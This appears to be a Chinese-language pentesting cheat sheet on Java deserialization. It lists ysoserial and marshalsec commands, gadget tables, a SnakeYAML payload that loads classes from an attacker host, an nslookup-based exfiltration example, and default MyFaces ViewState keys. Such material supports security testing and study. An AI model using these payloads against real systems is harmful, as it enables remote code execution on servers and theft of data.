# Java 反序列化

> Java 序列化是将 Java 对象的状态转换为字节流的过程，该字节流可以被存储或传输，并在以后重新构造（反序列化）回原始对象。Java 中的序列化主要通过 `Serializable` 接口实现，标记一个类为可序列化的，从而允许它保存到文件、通过网络发送或在 JVM 之间传输。

## 概述

* [检测](#检测)
* [工具](#工具)
    * [Ysoserial](#ysoserial)
    * [使用 Ysoserial 的 Burp 扩展](#burp-extensions)
    * [替代工具](#alternative-tooling)
* [YAML 反序列化](#yaml-反序列化)
* [ViewState](#viewstate)
* [参考文献](#参考文献)

## 检测

* Hex 中的 `"AC ED 00 05"`
    * `AC ED`: STREAM_MAGIC。指定这是一个序列化协议。
    * `00 05`: STREAM_VERSION。序列化版本。
* Base64 中的 `"rO0"`
* `Content-Type` = "application/x-java-serialized-object"
* Gzip(Base64) 中的 `"H4sIAAAAAAAAAJ"`

## 工具

### Ysoserial

[frohoff/ysoserial](https://github.com/frohoff/ysoserial)：一种用于生成利用不安全 Java 对象反序列化漏洞的有效载荷的概念验证工具。

```java
java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
```

**Ysoserial 包含的有效载荷列表：**

| 有效载荷            | 作者                                | 依赖项                     |
| ------------------- | ---------------------------------- | --------------------------- |
| AspectJWeaver       | @Jang                              | aspectjweaver:1.9.2, commons-collections:3.2.2 |
| BeanShell1          | @pwntester, @cschneider4711        | bsh:2.0b5                  |
| C3P0                | @mbechler                          | c3p0:0.9.5.2, mchange-commons-java:0.2.11 |
| Click1              | @artsploit                         | click-nodeps:2.3.0, javax.servlet-api:3.1.0 |
| Clojure             | @JackOfMostTrades                  | clojure:1.8.0              |
| CommonsBeanutils1   | @frohoff                           | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 |
| CommonsCollections1 | @frohoff                           | commons-collections:3.1    |
| CommonsCollections2 | @frohoff                           | commons-collections4:4.0   |
| CommonsCollections3 | @frohoff                           | commons-collections:3.1    |
| CommonsCollections4 | @frohoff                           | commons-collections4:4.0   |
| CommonsCollections5 | @matthias_kaiser, @jasinner        | commons-collections:3.1    |
| CommonsCollections6 | @matthias_kaiser                   | commons-collections:3.1    |
| CommonsCollections7 | @scristalli, @hanyrax, @EdoardoVignati | commons-collections:3.1    |
| FileUpload1         | @mbechler                          | commons-fileupload:1.3.1, commons-io:2.4 |
| Groovy1             | @frohoff                           | groovy:2.3.9               |
| Hibernate1          | @mbechler                          | -                          |
| Hibernate2          | @mbechler                          | -                          |
| JBossInterceptors1  | @matthias_kaiser                   | javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
| JRMPClient          | @mbechler                          | -                          |
| JRMPListener        | @mbechler                          | -                          |
| JSON1               | @mbechler                          | json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 |
| JavassistWeld1      | @matthias_kaiser                   | javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
| Jdk7u21             | @frohoff                           | -                          |
| Jython1             | @pwntester, @cschneider4711        | jython-standalone:2.5.2    |
| MozillaRhino1       | @matthias_kaiser                   | js:1.7R2                   |
| MozillaRhino2       | @_tint0                            | js:1.7R2                   |
| Myfaces1            | @mbechler                          | -                          |
| Myfaces2            | @mbechler                          | -                          |
| ROME                | @mbechler                          | rome:1.0                   |
| Spring1             | @frohoff                           | spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE |
| Spring2             | @mbechler                          | spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2 |
| URLDNS              | @gebl                              | -                          |
| Vaadin1             | @kai_ullrich                       | vaadin-server:7.7.14, vaadin-shared:7.7.14 |
| Wicket1             | @jacob-baines                      | wicket-util:6.23.0, slf4j-api:1.6.4 |

### Burp 扩展

* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) - 用于执行 Java 反序列化攻击的 Burp 扩展
* [federicodotta/Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) - Burp Suite 的一体化插件，用于检测和利用 Java 反序列化漏洞
* [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) - Burp Suite 的 YSOSERIAL 集成
* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) - Burp Java 反序列化漏洞识别
* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) - Java 反序列化漏洞主动识别 Burp 扩展

### 替代工具

* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) - 纯 JRE 8 远程代码执行反序列化小工具
* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss（及其他 Java 反序列化漏洞）验证与利用工具
* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) - 原始 Ysoserial 应用程序的分支
* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java 序列化暴力攻击工具
* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - 将 Java 序列化流以更易读的形式转储的工具
* [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe) - 利用反序列化进行远程类路径暴力破解
* [k3idii/Deserek](https://github.com/k3idii/Deserek) - 用于序列化和反序列化 Java 二进制序列化格式的 Python 代码。

  ```java
  java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
  python deserek.py yss_base.bin --format python > yss_url.py
  python yss_url.py yss_new.bin
  java -cp JavaSerializationTestSuite DeSerial yss_new.bin
  ```

* [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java Unmarshaller 安全性 - 将你的数据转换为代码执行

  ```java
  $ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
  $ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
  $ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
  // -a - 为该 marshaller 生成/测试所有有效载荷
  // -t - 测试模式，生成有效载荷后对其进行反序列化测试。
  // -v - 详细模式，例如在测试模式下也会显示生成的有效载荷。
  // gadget_type - 特定小工具的标识符，若省略将显示该特定 marshaller 支持的所有有效载荷。
  // arguments - 小工具特定参数
  ```

以下 marshaller 包含的有效载荷生成器：

| Marshaller                      | 小工具影响                                 |
| ------------------------------- | ------------------------------------------- |
| BlazeDSAMF(0&#124;3&#124;X)     | JDK 仅限升级到 Java 序列化各种第三方库 RCEs |
| Hessian&#124;Burlap             | 各种第三方 RCEs                           |
| Castor                          | 依赖库 RCE                               |
| Jackson                         | **可能仅为 JDK RCE**，各种第三方 RCEs      |
| Java                            | 另一个第三方 RCE                         |
| JsonIO                          | **仅为 JDK RCE**                        |
| JYAML                           | **仅为 JDK RCE**                        |
| Kryo                            | 第三方 RCEs                              |
| KryoAltStrategy                 | **仅为 JDK RCE**                        |
| Red5AMF(0&#124;3)               | **仅为 JDK RCE**                        |
| SnakeYAML                       | **仅为 JDK RCEs**                       |
| XStream                         | **仅为 JDK RCEs**                       |
| YAMLBeans                       | 第三方 RCE                               |

## YAML 反序列化

SnakeYAML 是一个流行的基于 Java 的库，用于解析和生成 YAML 数据（YAML Ain't Markup Language）。它提供了易于使用的 API 来处理 YAML，这是一种人类可读的数据序列化标准，常用于配置文件和数据交换。

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

## ViewState

在 Java 中，ViewState 是指像 JavaServer Faces (JSF) 这样的框架用来在 Web 应用程序中保持 UI 组件状态的机制。主要有两种实现方式：

* Oracle Mojarra（JSF 参考实现）
* Apache MyFaces

**工具**：

* [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - JexBoss: Jboss（以及其他 Java 反序列化漏洞）验证与利用工具
* [Synacktiv-contrib/inyourface](https://github.com/Synacktiv-contrib/inyourface) - InYourFace 是一个用于修补未加密和未签名 JSF ViewStates 的软件。

### 编码

| 编码      | 开头字符 |
| ---------- | -------- |
| base64     | `rO0`    |
| base64 + gzip | `H4sIAAA` |

### 存储

`javax.faces.STATE_SAVING_METHOD` 是 JavaServer Faces (JSF) 中的一个配置参数。它指定框架如何在 HTTP 请求之间保存组件树的状态（页面上 UI 组件的结构和数据）。

存储方法也可以从 HTML 主体中的视图状态表示形式推断出来。

* **服务器端**存储：`value="-XXX:-XXXX"`
* **客户端**存储：`base64 + gzip + Java 对象`

### 加密

默认情况下，MyFaces 使用 DES 作为加密算法，HMAC-SHA1 用于验证 ViewState。建议配置更现代的算法，如 AES 和 HMAC-SHA256。

| 加密算法 | HMAC       |
| -------- | ---------- |
| DES ECB（默认） | HMAC-SHA1  |

支持的加密方法有 BlowFish、3DES、AES，由上下文参数定义。
这些参数的值及其密钥可以在以下 XML 部分中找到。

```xml
<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>   
<param-name>org.apache.myfaces.SECRET</param-name>   
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
```

来自 [文档](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application) 的常见密钥。

| 名称                 | 值                              |
| -------------------- | -------------------------------- |
| AES CBC/PKCS5Padding | `NzY1NDMyMTA3NjU0MzIxMA==`       |
| DES                  | `NzY1NDMyMTA=`                  |
| DESede               | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| Blowfish             | `NzY1NDMyMTA3NjU0MzIxMA`        |
| AES CBC              | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| AES CBC IV           | `NzY1NDMyMTA3NjU0MzIxMA==`      |

* **加密**: 数据 -> 加密 -> hmac_sha1 签名 -> base64 编码 -> url 编码 -> ViewState
* **解密**: ViewState -> url 解码 -> base64 解码 -> hmac_sha1 验证 -> 解密 -> 数据

## 参考文献

* [通过 DNS 外泄检测反序列化漏洞 - Philippe Arteau - 2017年3月22日](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
* [Hack The Box - Arkham - 0xRick - 2019年8月10日](https://0xrick.github.io/hack-the-box/arkham/)
* [发现价值1500美元的反序列化漏洞 - Ashish Kunwar - 2018年8月28日](https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
* [Jackson CVE-2019-12384：漏洞类剖析 - Andrea Brancaleoni - 2019年7月22日](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
* [Java 反序列化在 ViewState 中的应用 - Haboob 团队 - 2020年12月23日](https://www.exploit-db.com/docs/48126)
* [Java 反序列化速查表 - Aleksei Tiurin - 2023年5月23日](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)
* [JSF ViewState 倒置 - Renaud Dubourguais, Nicolas Collignon - 2016年3月15日](https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf)
* [配置不当的 JSF ViewStates 可能导致严重的 RCE 漏洞 - Peter Stöckli - 2017年8月14日](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
* [配置不当的 JSF ViewStates 可能导致严重的 RCE 漏洞 - Peter Stöckli - 2017年8月14日](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
* [关于 Jackson CVEs：不要恐慌——你需要知道的一切 - cowtowncoder - 2017年12月22日](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96)
* [ForgeRock OpenAM 预认证 RCE（CVE-2021-35464）- Michael Stepankin (@artsploit) - 2021年6月29日](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
* [利用 Java 反序列化触发 DNS 查询 - paranoidsoftware.com - 2020年7月5日](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* [理解并实践 Java 反序列化漏洞利用 - Diablohorn - 2017年9月9日](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)